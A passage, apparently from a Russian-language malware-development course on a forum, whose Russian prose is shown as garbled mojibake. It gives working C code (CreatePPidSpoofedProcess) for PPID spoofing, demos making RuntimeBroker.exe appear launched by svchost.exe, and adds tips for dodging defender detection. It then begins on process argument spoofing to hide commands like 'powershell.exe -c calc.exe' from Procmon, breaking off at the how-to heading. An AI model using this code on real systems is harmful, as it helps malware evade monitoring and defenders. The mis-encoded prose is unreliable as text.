–ü–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–π –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ —Å–ø–∏—Å–∫–∞ –∞—Ç—Ä–∏–±—É—Ç–æ–≤ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ WinAPI UpdateProcThreadAttribute, —á—Ç–æ–±—ã –¥–æ–±–∞–≤–∏—Ç—å –∞—Ç—Ä–∏–±—É—Ç—ã –≤ —Å–ø–∏—Å–æ–∫. –§—É–Ω–∫—Ü–∏—è –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∞ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL UpdateProcThreadAttribute(
  [in, out]       LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,   // –≤–æ–∑–≤—Ä–∞—â–∞–µ–º–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –æ—Ç InitializeProcThreadAttributeList
  [in]            DWORD                        dwFlags,           // NULL (–∑–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω–æ)
  [in]            DWORD_PTR                    Attribute,
  [in]            PVOID                        lpValue,           // —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –∑–Ω–∞—á–µ–Ω–∏–µ –∞—Ç—Ä–∏–±—É—Ç–∞
  [in]            SIZE_T                       cbSize,            // sizeof(lpValue)
  [out, optional] PVOID                        lpPreviousValue,   // NULL (–∑–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω–æ)
  [in, optional]  PSIZE_T                      lpReturnSize       // NULL (–∑–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω–æ)
);</code></pre>
	</div>
</div><br />
Attribute - –≠—Ç–æ—Ç —Ñ–ª–∞–≥ –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏ –≤–∞–∂–µ–Ω –¥–ª—è PPID spoofing –∏ —É–∫–∞–∑—ã–≤–∞–µ—Ç, —á—Ç–æ —Å–ª–µ–¥—É–µ—Ç –æ–±–Ω–æ–≤–∏—Ç—å –≤ —Å–ø–∏—Å–∫–µ –∞—Ç—Ä–∏–±—É—Ç–æ–≤. –í —ç—Ç–æ–º —Å–ª—É—á–∞–µ –æ–Ω –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –Ω–∞ —Ñ–ª–∞–≥ PROC_THREAD_ATTRIBUTE_PARENT_PROCESS –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ.<br />
<br />
–§–ª–∞–≥ PROC_THREAD_ATTRIBUTE_PARENT_PROCESS —É–∫–∞–∑—ã–≤–∞–µ—Ç —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–∏–π –ø—Ä–æ—Ü–µ—Å—Å –ø–æ—Ç–æ–∫–∞. –í –æ–±—â–µ–º —Å–ª—É—á–∞–µ —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–∏–π –ø—Ä–æ—Ü–µ—Å—Å –ø–æ—Ç–æ–∫–∞ ‚Äî —ç—Ç–æ –ø—Ä–æ—Ü–µ—Å—Å, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–∑–¥–∞–ª –ø–æ—Ç–æ–∫. –ï—Å–ª–∏ –ø–æ—Ç–æ–∫ —Å–æ–∑–¥–∞–µ—Ç—Å—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Ñ—É–Ω–∫—Ü–∏–∏ CreateThread, —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–∏–π –ø—Ä–æ—Ü–µ—Å—Å ‚Äî —ç—Ç–æ —Ç–æ—Ç, –∫–æ—Ç–æ—Ä—ã–π –≤—ã–∑–≤–∞–ª —Ñ—É–Ω–∫—Ü–∏—é CreateThread. –ï—Å–ª–∏ –ø–æ—Ç–æ–∫ —Å–æ–∑–¥–∞–µ—Ç—Å—è –∫–∞–∫ —á–∞—Å—Ç—å –Ω–æ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Ñ—É–Ω–∫—Ü–∏–∏ CreateProcess, —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–∏–π –ø—Ä–æ—Ü–µ—Å—Å ‚Äî —ç—Ç–æ –Ω–æ–≤—ã–π –ø—Ä–æ—Ü–µ—Å—Å. –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –ø–æ—Ç–æ–∫–∞ —Ç–∞–∫–∂–µ –æ–±–Ω–æ–≤–∏—Ç —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–∏–π –ø—Ä–æ—Ü–µ—Å—Å —Å–≤—è–∑–∞–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />
lpValue - –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />
cbSize - –†–∞–∑–º–µ—Ä –∑–Ω–∞—á–µ–Ω–∏—è –∞—Ç—Ä–∏–±—É—Ç–∞, —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º lpValue. –≠—Ç–æ –±—É–¥–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –≤ sizeof(HANDLE).<br />
<br />
<b>–õ–æ–≥–∏–∫–∞ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏</b><br />
<br />
–®–∞–≥–∏ –Ω–∏–∂–µ –ø–æ–¥–≤–æ–¥—è—Ç –∏—Ç–æ–≥ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö –¥–µ–π—Å—Ç–≤–∏–π –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è PPID spoofing.<br />
<ol>
<li data-xf-list-type="ol">–í—ã–∑—ã–≤–∞–µ—Ç—Å—è CreateProcessA —Å —Ñ–ª–∞–≥–æ–º EXTENDED_STARTUPINFO_PRESENT –¥–ª—è –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–≥–æ –∫–æ–Ω—Ç—Ä–æ–ª—è –Ω–∞–¥ —Å–æ–∑–¥–∞–Ω–Ω—ã–º –ø—Ä–æ—Ü–µ—Å—Å–æ–º.</li>
<li data-xf-list-type="ol">–°–æ–∑–¥–∞–µ—Ç—Å—è —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ STARTUPINFOEXA, –∫–æ—Ç–æ—Ä–∞—è —Å–æ–¥–µ—Ä–∂–∏—Ç —Å–ø–∏—Å–æ–∫ –∞—Ç—Ä–∏–±—É—Ç–æ–≤, LPPROC_THREAD_ATTRIBUTE_LIST.</li>
<li data-xf-list-type="ol">–í—ã–∑—ã–≤–∞–µ—Ç—Å—è InitializeProcThreadAttributeList –¥–ª—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ —Å–ø–∏—Å–∫–∞ –∞—Ç—Ä–∏–±—É—Ç–æ–≤. –§—É–Ω–∫—Ü–∏—é —Å–ª–µ–¥—É–µ—Ç –≤—ã–∑—ã–≤–∞—Ç—å –¥–≤–∞–∂–¥—ã, –ø–µ—Ä–≤—ã–π —Ä–∞–∑ –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç —Ä–∞–∑–º–µ—Ä —Å–ø–∏—Å–∫–∞ –∞—Ç—Ä–∏–±—É—Ç–æ–≤, –∞ —Å–ª–µ–¥—É—é—â–∏–π –≤—ã–∑–æ–≤ –æ—Å—É—â–µ—Å—Ç–≤–ª—è–µ—Ç –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—é.</li>
<li data-xf-list-type="ol">UpdateProcThreadAttribute –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –∞—Ç—Ä–∏–±—É—Ç–æ–≤, —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—è —Ñ–ª–∞–≥ PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é —É–∫–∞–∑–∞—Ç—å —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–∏–π –ø—Ä–æ—Ü–µ—Å—Å –ø–æ—Ç–æ–∫–∞.</li>
</ol><br />
–§—É–Ω–∫—Ü–∏—è PPID Spoofing<br />
<br />
CreatePPidSpoofedProcess ‚Äî —ç—Ç–æ —Ñ—É–Ω–∫—Ü–∏—è, –∫–æ—Ç–æ—Ä–∞—è —Å–æ–∑–¥–∞—ë—Ç –ø—Ä–æ—Ü–µ—Å—Å —Å –ø–æ–¥–¥–µ–ª—å–Ω—ã–º PPID.<br />
<br />
–§—É–Ω–∫—Ü–∏—è –ø—Ä–∏–Ω–∏–º–∞–µ—Ç 5 –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤:<br />
<br />
hParentProcess - –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞, –∫–æ—Ç–æ—Ä—ã–π —Å—Ç–∞–Ω–µ—Ç —Ä–æ–¥–∏—Ç–µ–ª–µ–º –¥–ª—è —Ç–æ–ª—å–∫–æ —á—Ç–æ —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />
lpProcessName - –∏–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞, –∫–æ—Ç–æ—Ä—ã–π –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å–æ–∑–¥–∞—Ç—å.<br />
<br />
dwProcessId - —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ DWORD, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–∏–Ω–∏–º–∞–µ—Ç PID –Ω–æ–≤–æ—Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />
hProcess - —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ HANDLE, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ç–æ–ª—å–∫–æ —á—Ç–æ —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />
hThread - —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ HANDLE, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø–æ—Ç–æ–∫–∞ —Ç–æ–ª—å–∫–æ —á—Ç–æ —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL CreatePPidSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];

    SIZE_T sThreadAttList = NULL;
    PPROC_THREAD_ATTRIBUTE_LIST pThreadAttList = NULL;

    STARTUPINFOEXA SiEx = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    RtlSecureZeroMemory(&amp;SiEx, sizeof(STARTUPINFOEXA));
    RtlSecureZeroMemory(&amp;Pi, sizeof(PROCESS_INFORMATION));

    // –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Ä–∞–∑–º–µ—Ä–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã
    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    if (!GetEnvironmentVariableA(&quot;WINDIR&quot;, WnDr, MAX_PATH)) {
        printf(&quot;[!] GetEnvironmentVariableA Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    sprintf(lpPath, &quot;%s\\System32\\%s&quot;, WnDr, lpProcessName);

    // –≠—Ç–æ –∑–∞–≤–µ—Ä—à–∏—Ç—Å—è –æ—à–∏–±–∫–æ–π ERROR_INSUFFICIENT_BUFFER, –∫–∞–∫ –∏ –æ–∂–∏–¥–∞–ª–æ—Å—å
    InitializeProcThreadAttributeList(NULL, 1, NULL, &amp;sThreadAttList);

    // –í—ã–¥–µ–ª–µ–Ω–∏–µ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ–≥–æ –æ–±—ä–µ–º–∞ –ø–∞–º—è—Ç–∏
    pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
    if (pThreadAttList == NULL) {
        printf(&quot;[!] HeapAlloc Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // –ü–æ–≤—Ç–æ—Ä–Ω—ã–π –≤—ã–∑–æ–≤ InitializeProcThreadAttributeList, –Ω–æ –ø–µ—Ä–µ–¥–∞—á–∞ –ø—Ä–∞–≤–∏–ª—å–Ω—ã—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
    if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &amp;sThreadAttList)) {
        printf(&quot;[!] InitializeProcThreadAttributeList Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;hParentProcess, sizeof(HANDLE), NULL, NULL)) {
        printf(&quot;[!] UpdateProcThreadAttribute Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —ç–ª–µ–º–µ–Ω—Ç–∞ LPPROC_THREAD_ATTRIBUTE_LIST –≤ SiEx —Ä–∞–≤–Ω—ã–º —Ç–æ–º—É, —á—Ç–æ –±—ã–ª–æ —Å–æ–∑–¥–∞–Ω–æ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º UpdateProcThreadAttribute - —Ç–æ –µ—Å—Ç—å —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–∏–π –ø—Ä–æ—Ü–µ—Å—Å
    SiEx.lpAttributeList = pThreadAttList;

    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &amp;SiEx.StartupInfo, &amp;Pi)) {
        printf(&quot;[!] CreateProcessA Failed with Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    // –û—á–∏—Å—Ç–∫–∞
    DeleteProcThreadAttributeList(pThreadAttList);
    CloseHandle(hParentProcess);

    if (*dwProcessId != NULL &amp;&amp; *hProcess != NULL &amp;&amp; *hThread != NULL)
        return TRUE;

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>–î–µ–º–æ</b><br />
<br />
–°–æ–∑–¥–∞–Ω–∏–µ –¥–æ—á–µ—Ä–Ω–µ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, RuntimeBroker.exe, —Å —Ä–æ–¥–∏—Ç–µ–ª–µ–º svchost.exe, –∫–æ—Ç–æ—Ä—ã–π –∏–º–µ–µ—Ç PID 21956. –û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ —ç—Ç–æ—Ç –ø—Ä–æ—Ü–µ—Å—Å svchost.exe –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è —Å –æ–±—ã—á–Ω—ã–º–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784020245.png"
		data-src="https://osint42.org/attachments/1746784020245-png.162/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784020245-png.162/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784020245.png"
			title="1746784020245.png"
			width="1244" height="497" loading="lazy" />
	</div><br />
<br />
PPID Spoofing —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω. –ü—Ä–æ—Ü–µ—Å—Å RuntimeBroker.exe –≤—ã–≥–ª—è–¥–∏—Ç —Ç–∞–∫, –∫–∞–∫ –±—É–¥—Ç–æ –æ–Ω –±—ã–ª –∑–∞–ø—É—â–µ–Ω svchost.exe.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784027530.png"
		data-src="https://osint42.org/attachments/1746784027530-png.163/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784027530-png.163/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784027530.png"
			title="1746784027530.png"
			width="1240" height="711" loading="lazy" />
	</div><br />
<br />
–î–µ–º–æ 2 - –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Ç–µ–∫—É—â–µ–≥–æ –∫–∞—Ç–∞–ª–æ–≥–∞<br />
<br />
–ó–∞–º–µ—Ç—å—Ç–µ, –∫–∞–∫ –≤ –ø—Ä–µ–¥—ã–¥—É—â–µ–º –¥–µ–º–æ –∑–Ω–∞—á–µ–Ω–∏–µ &quot;Current Directory&quot; —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ –∫–∞—Ç–∞–ª–æ–≥ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞ PPidSpoofing.exe.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784034641.png"
		data-src="https://osint42.org/attachments/1746784034641-png.164/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784034641-png.164/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784034641.png"
			title="1746784034641.png"
			width="872" height="118" loading="lazy" />
	</div><br />
<br />
–≠—Ç–æ –º–æ–∂–µ—Ç –ª–µ–≥–∫–æ —Å—Ç–∞—Ç—å –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä–æ–º –∑–∞—Ä–∞–∂–µ–Ω–∏—è, –∏ —Ä–µ—à–µ–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏–ª–∏ –∑–∞—â–∏—Ç–Ω–∏–∫–∏ –º–æ–≥—É—Ç –±—ã—Å—Ç—Ä–æ –ø–æ–º–µ—Ç–∏—Ç—å —ç—Ç—É –∞–Ω–æ–º–∞–ª–∏—é. –ß—Ç–æ–±—ã –∏—Å–ø—Ä–∞–≤–∏—Ç—å —ç—Ç–æ, –ø—Ä–æ—Å—Ç–æ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –ø–∞—Ä–∞–º–µ—Ç—Ä lpCurrentDirectory –≤ CreateProcess WinAPI –Ω–∞ –º–µ–Ω–µ–µ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–π –∫–∞—Ç–∞–ª–æ–≥, –Ω–∞–ø—Ä–∏–º–µ—Ä, &quot;C:\Windows\System32&quot;.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784040876.png"
		data-src="https://osint42.org/attachments/1746784040876-png.165/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784040876-png.165/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784040876.png"
			title="1746784040876.png"
			width="1284" height="651" loading="lazy" />
	</div><br />
<br />
<br />
<b>–î–∞–≤–∞–π—Ç–µ —Ç–µ–ø–µ—Ä—å –µ—â—ë —Ä–∞—Å—Å–º–æ—Ç—Ä–∏–º –æ–¥–Ω—É –∏–Ω—Ç–µ—Ä–µ—Å–Ω—É—é —Ç–µ—Ö–Ω–∏–∫—É.)<br />
<br />
–ü–æ–¥–º–µ–Ω–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞</b> - —ç—Ç–æ —Ç–µ—Ö–Ω–∏–∫–∞, –∏—Å–ø–æ–ª—å–∑—É–µ–º–∞—è –¥–ª—è —Å–∫—Ä—ã—Ç–∏—è –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏ –Ω–æ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ —Å —Ü–µ–ª—å—é –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥ –±–µ–∑ –∏—Ö —Ä–∞—Å–∫—Ä—ã—Ç–∏—è —Å–ª—É–∂–±–∞–º —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏, —Ç–∞–∫–∏–º –∫–∞–∫ Procmon.<br />
<br />
–ù–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –Ω–∏–∂–µ –ø–æ–∫–∞–∑–∞–Ω–∞ –∫–æ–º–∞–Ω–¥–∞ powershell.exe -c calc.exe, –∫–æ—Ç–æ—Ä–∞—è —Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ—Ç—Å—è –≤ Procmon. –¶–µ–ª—å —ç—Ç–æ–≥–æ —Ä–∞–∑–¥–µ–ª–∞ - –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É powershell.exe -c calc.exe, —á—Ç–æ–±—ã –æ–Ω–∞ –Ω–µ –±—ã–ª–∞ —É—Å–ø–µ—à–Ω–æ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–∞ –≤ Procmon.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784049732.png"
		data-src="https://osint42.org/attachments/1746784049732-png.166/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784049732-png.166/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784049732.png"
			title="1746784049732.png"
			width="1536" height="711" loading="lazy" />
	</div><br />
<br />
<br />
<b>–û–±–∑–æ—Ä PEB (–ë–ª–æ–∫ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞)</b><br />
<br />
–ü–µ—Ä–≤—ã–π —à–∞–≥ –∫ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—é –æ–±–º–∞–Ω–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–∞ - –ø–æ–Ω—è—Ç—å, –≥–¥–µ —Ö—Ä–∞–Ω—è—Ç—Å—è –∞—Ä–≥—É–º–µ–Ω—Ç—ã –≤–Ω—É—Ç—Ä–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞. –ù–∞–ø–æ–º–Ω–∏–º —Å—Ç—Ä—É–∫—Ç—É—Ä—É PEB, –∫–æ—Ç–æ—Ä–∞—è –±—ã–ª–∞ –æ–±—ä—è—Å–Ω–µ–Ω–∞ –≤ –Ω–∞—á–∞–ª–µ –∫—É—Ä—Å–∞, –æ–Ω–∞ —Å–æ–¥–µ—Ä–∂–∏—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø—Ä–æ—Ü–µ—Å—Å–µ. –ë–æ–ª–µ–µ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ, —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ RTL_USER_PROCESS_PARAMETERS –≤–Ω—É—Ç—Ä–∏ PEB —Å–æ–¥–µ—Ä–∂–∏—Ç —á–ª–µ–Ω CommandLine, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–¥–µ—Ä–∂–∏—Ç –∞—Ä–≥—É–º–µ–Ω—Ç—ã –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏. –°—Ç—Ä—É–∫—Ç—É—Ä–∞ RTL_USER_PROCESS_PARAMETERS –ø–æ–∫–∞–∑–∞–Ω–∞ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _RTL_USER_PROCESS_PARAMETERS {
  BYTE           Reserved1[16];
  PVOID          Reserved2[10];
  UNICODE_STRING ImagePathName;
  UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;</code></pre>
	</div>
</div><br />
CommandLine –æ–ø—Ä–µ–¥–µ–ª–µ–Ω –∫–∞–∫ UNICODE_STRING.<br />
<br />
<b>–°—Ç—Ä—É–∫—Ç—É—Ä–∞ UNICODE_STRING</b><br />
<br />
–°—Ç—Ä—É–∫—Ç—É—Ä–∞ UNICODE_STRING –ø–æ–∫–∞–∑–∞–Ω–∞ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;</code></pre>
	</div>
</div><br />
–≠–ª–µ–º–µ–Ω—Ç Buffer –±—É–¥–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤ –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏. –ò–º–µ—è —ç—Ç–æ –≤ –≤–∏–¥—É, –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∞—Ä–≥—É–º–µ–Ω—Ç–∞–º –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏, –∏—Å–ø–æ–ª—å–∑—É—è PEB-&gt;ProcessParameters.CommandLine.Buffer –∫–∞–∫ —Å—Ç—Ä–æ–∫—É —à–∏—Ä–æ–∫–∏—Ö —Å–∏–º–≤–æ–ª–æ–≤.<br />
<br />
<b>–ö–∞–∫ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ø–æ–¥–º–µ–Ω—É –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤ –ø—Ä–æ—Ü–µ—Å—Å–∞</b><br />
